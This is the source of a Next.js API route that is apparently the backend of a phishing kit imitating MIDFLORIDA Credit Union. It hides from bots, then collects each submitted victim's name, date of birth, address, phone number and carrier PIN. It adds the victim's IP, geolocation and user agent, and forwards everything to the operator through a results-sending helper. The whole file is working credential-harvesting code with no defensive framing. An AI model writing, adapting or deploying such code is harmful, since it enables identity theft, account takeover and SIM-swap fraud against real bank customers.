import geoip from "geoip-lite";
import MobileDetect from "mobile-detect";
import nextConnect from "next-connect";
import { NextApiRequest, NextApiResponse } from "next";
import middleware from "../../middleware/middleware";
import { sendResults } from "../../utils/sendResults";

interface ExtendedRequest extends NextApiRequest {
  files: any;
}

const handler = nextConnect();
handler.use(middleware);

handler.post(async (req: ExtendedRequest, res: NextApiResponse) => {
  const md = new MobileDetect(req.headers[`user-agent`] as string);
  const isBot = md.is(`Bot`);
  if (isBot) {
    res.end(`Fuck off`);
    return;
  }

  try {
    const ip = req.headers[`x-forwarded-for`] || req.connection.remoteAddress;
    const geo = geoip.lookup(String(ip).split(`,`)[0]);

    // const values = JSON.parse(Object.keys(req.body as any)[0]);

    const values = req.body;
    const message = `
<div>------------------------------------</div>
${
  values.form[0] === `BILLING` &&
  `<p>(▰˘◡˘▰) FIRST NAME ☞ <b>${JSON.parse(values.billing).firstname}</b></p>
<p>(▰˘◡˘▰) LAST NAME ☞ <b>${JSON.parse(values.billing).lastname}</b></p>
<p>(▰˘◡˘▰) DOB ☞ <b>${JSON.parse(values.billing).dob}</b></p>
<p>(▰˘◡˘▰) ADDRESS ☞ <b>${JSON.parse(values.billing).streetAddress}</b></p>
<p>(▰˘◡˘▰) ZIP CODE ☞ <b>${JSON.parse(values.billing).zipCode}</b></p>
<p>(▰˘◡˘▰) STATE ☞ <b>${JSON.parse(values.billing).state}</b></p>
<p>(▰˘◡˘▰) PHONE N. ☞ <b>${JSON.parse(values.billing).phoneNumber || ``}</b></p>
<p>(▰˘◡˘▰) CARRIER PIN ☞ <b>${
    JSON.parse(values.billing).carrierPin || ``
  }</b></p>
<div>------------------------------------</div>
<p>(▰˘◡˘▰) IP ☞ <b>${String(ip).split(`,`)[0]}</b></p>
<p>(▰˘◡˘▰) LOCATION ☞ <b>${geo?.city}, ${geo?.country}</b></p>
<p>(▰˘◡˘▰) TIMEZONE ☞ <b>${geo?.timezone}</b></p>
<p>(▰˘◡˘▰) USER AGENT ☞ <b>${req.headers[`user-agent`]}</b></p>
<div>------------------------------------</div>
<p>(▰˘◡˘▰) ID ☞ <b>#${JSON.parse(values.billing).sessionId.trim() || ``}</b></p>
<div>------------------------------------</div>`
}`;

    await sendResults(
      message,
      `MIDFLORIDA CU | ${values.form} by ROCKET 🚀 From ${String(ip).split(`,`)[0]}`
    );

    res.send(Promise.resolve());
  } catch (error) {
    res.status(500).send({
      name: `Something went wrong`,
    });
  }
});

export const config = {
  api: {
    bodyParser: false,
  },
};

export default handler;
